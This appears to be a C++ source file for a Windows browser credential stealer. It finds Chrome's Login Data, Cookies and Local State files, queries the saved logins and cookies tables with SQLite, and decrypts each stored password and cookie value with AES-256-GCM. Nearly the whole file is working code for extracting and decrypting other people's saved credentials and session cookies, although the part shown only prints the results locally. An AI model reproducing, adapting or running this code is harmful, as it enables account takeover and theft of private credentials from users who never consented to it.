#include "everything.h"

/* Report */
VOID ReportError(LPCSTR userMessage, DWORD exitCode, BOOL printErrorMessage) {
	DWORD eMsgLen, errNum = GetLastError();
	LPTSTR lpvSysMsg;
	fprintf(stderr, "%s\n", userMessage);
	if (printErrorMessage) {
		eMsgLen = FormatMessage(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM,
			NULL, errNum, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
			(LPTSTR)&lpvSysMsg, 0, NULL);
		if (eMsgLen > 0)
		{
			fprintf(stderr, "%s\n", lpvSysMsg);
		}
		else
		{
			fprintf(stderr, "Last Error Number; %d.\n", errNum);
		}

		if (lpvSysMsg != NULL) LocalFree(lpvSysMsg);
	}

	if (exitCode > 0)
		ExitProcess(exitCode);

	return;
}


VOID ReportException(LPSTR userMessage, DWORD exceptionCode) {
	if (lstrlenA(userMessage) > 0)
		ReportError(userMessage, 0, TRUE);

	if (exceptionCode != 0)
		RaiseException(
		(0x0FFFFFFF & exceptionCode) | 0xE0000000, 0, 0, NULL);

	return;
}

BOOL isFileGood(LPCSTR filename) {
	std::ifstream ifs(filename, std::ifstream::in);
	return ifs.good();
}
/* Path resolve */
bool getLocalAppDataPath(LPSTR* path) {
	HANDLE token;
	*path = (LPSTR)malloc(MAX_PATH);
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token)) {
		if (SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, token, SHGFP_TYPE_DEFAULT, *path) == S_OK) {
			return true;
		}
		else {
			ReportError("Failed to get local appdata", 1, true);
		}
	}
	else {
		ReportError("Failed open process token", 1, true);
	}
	return false;
}

bool getVersionPath(LPSTR* path) {
	if (getLocalAppDataPath(path)) {
		strcat_s(*path, MAX_PATH, "\\Google\\Chrome\\User Data\\Last Version");
		fprintf(stderr, "[Log] Got path: %s\n", *path);
		return true;
	}
	return false;
}

bool getLocalStatePath(LPSTR* path) {
	if (getLocalAppDataPath(path)) {
		strcat_s(*path, MAX_PATH, "\\Google\\Chrome\\User Data\\Local State");
		fprintf(stderr, "[Log] Got path: %s\n", *path);
		return true;
	}
	return false;
}

bool getLoginDataPath(LPSTR* path) {
	if (getLocalAppDataPath(path)) {
		strcat_s(*path, MAX_PATH, "\\Google\\Chrome\\User Data\\Default\\Login Data");
		fprintf(stderr, "[Log] Got path: %s\n", *path);
		return true;
	}
	return false;
}

bool getCookiePath(LPSTR* path) {
	if (getLocalAppDataPath(path)) {
		strcat_s(*path, MAX_PATH, "\\Google\\Chrome\\User Data\\Default\\Cookies");
		fprintf(stderr, "[Log] Got path: %s\n", *path);
		return true;
	}
	return false;
}

/* Log functions */
void printHex(BYTE* arr, int len) {
	for (int i = 0; i < len; i++) {
		printf("%x", arr[i]);
	}
	std::cout << std::endl;
}

void outputaesinfo(aes256gcm_info* info) {
	printHex(info->gcm_ct, info->gcm_ct_len);
	printHex(info->gcm_iv, info->gcm_iv_len);
	printHex(info->gcm_tag, info->gcm_tag_len);
	printHex(info->gcm_aad, info->gcm_aad_len);
}


void rangeFill(BYTE* dst, BYTE* src, int start, int end) {
	int i = 0;
	while (start < end) dst[i++] = src[start++];
}

void fillAES256GCM(aes256gcm_info* info, BYTE* key, int key_len, BYTE* buffer, int len) {
	int ciphertext_len = len - 12 - 16 - 3;
	unsigned char* iv = (unsigned char*)malloc(12);
	unsigned char* tag = (unsigned char*)malloc(16);
	unsigned char* ciphertext = (unsigned char*)malloc(ciphertext_len);
	rangeFill(iv, buffer, 3, 15);
	rangeFill(tag, buffer, len - 16, len);
	rangeFill(ciphertext, buffer, 15, ciphertext_len + 15);
	info->gcm_key = key; info->gcm_key_len = key_len+1;
	info->gcm_iv = iv; info->gcm_iv_len = 12;
	info->gcm_aad = NULL; info->gcm_aad_len = 0;
	info->gcm_ct = ciphertext; info->gcm_ct_len = ciphertext_len;
	info->gcm_tag = tag; info->gcm_tag_len = 16;
}

void freeAES256GCM(aes256gcm_info* info) {
	if (info) {
		if (info->gcm_iv) free(info->gcm_iv);
		if (info->gcm_aad) free(info->gcm_aad);
		if (info->gcm_ct) free(info->gcm_ct);
		if (info->gcm_tag) free(info->gcm_tag);
	}
}

void loginDataDecrypt(LPSTR loginDataPath,BYTE* key) {
	std::cout << "[***] Decrypting login data " << std::endl;
	// sqlite3 initialization
	sqlite3* db;
	sqlite3_stmt* statement;
	int rc = sqlite3_open(loginDataPath, &db);
	if (rc) {
		std::cerr << "Can't open database: " << sqlite3_errmsg(db) << std::endl;
	}
	else {
		std::cerr << "Database opened" << std::endl;
	}

	const char* sql = "SELECT origin_url, username_value, length(password_value), password_value FROM logins";

	if (rc == SQLITE_OK) {
		// prepare statement to compile
		if ((rc = sqlite3_prepare_v2(db, sql, -1, &statement, 0)) == SQLITE_OK) {
			// step through the statement
			int idx = 0;
			while ((rc = sqlite3_step(statement)) == SQLITE_ROW) {
				char* origin_url = (char*)sqlite3_column_text(statement, 0);
				char* username_value = (char*)sqlite3_column_text(statement, 1);
				int password_length = sqlite3_column_int(statement, 2);
				BYTE* password = (BYTE*)sqlite3_column_text(statement, 3);
				std::cout << "------------" << idx++ << std::endl;
				std::cout << "url - " << origin_url << std::endl;
				std::cout << "username - " << username_value << std::endl;
				aes256gcm_info* info = (aes256gcm_info*)malloc(sizeof(aes256gcm_info));
				fillAES256GCM(info, key, EVP_MAX_KEY_LENGTH, password, password_length);
				// outputaesinfo(info);
				aes_gcm_decrypt(info);
				freeAES256GCM(info);
				free(info);
			}
			if (rc != SQLITE_DONE)
				std::cout << "Statement error " << sqlite3_errmsg(db) << std::endl;
		}
		else {
			std::cout << "Cannot prepare statement " << sqlite3_errmsg(db) << std::endl;
		}
	}
}

void cookieDecrypt(LPSTR cookiePath, BYTE* key) {
	std::cout << "[***] Decrypting cookie " << std::endl;
	// sqlite3 initialization
	sqlite3* db;
	sqlite3_stmt* statement;
	int rc = sqlite3_open(cookiePath, &db);
	if (rc) {
		std::cerr << "Can't open database: " << sqlite3_errmsg(db) << std::endl;
	}
	else {
		std::cerr << "Database opened" << std::endl;
	}

	const char* sql = "SELECT host_key, name, length(encrypted_value), encrypted_value FROM cookies";

	if (rc == SQLITE_OK) {
		// prepare statement to compile
		if ((rc = sqlite3_prepare_v2(db, sql, -1, &statement, 0)) == SQLITE_OK) {
			// step through the statement
			int idx = 0;
			while ((rc = sqlite3_step(statement)) == SQLITE_ROW) {
				char* host_key = (char*)sqlite3_column_text(statement, 0);
				char* name = (char*)sqlite3_column_text(statement, 1);
				int encrypted_value_len = sqlite3_column_int(statement, 2);
				BYTE* encrypted_value = (BYTE*)sqlite3_column_text(statement, 3);
				std::cout << "------------" << idx++ << std::endl;
				std::cout << "host key - " << host_key << std::endl;
				std::cout << "name - " << name << std::endl;
				aes256gcm_info* info = (aes256gcm_info*)malloc(sizeof(aes256gcm_info));
				fillAES256GCM(info, key, 32, encrypted_value, encrypted_value_len);
				// outputaesinfo(info);
				aes_gcm_decrypt(info);
				freeAES256GCM(info);
				free(info);
			}
			if (rc != SQLITE_DONE)
				std::cout << "Statement error " << sqlite3_errmsg(db) << std::endl;
		}
		else {
			std::cout << "Cannot prepare statement " << sqlite3_errmsg(db) << std::endl;
		}
	}
}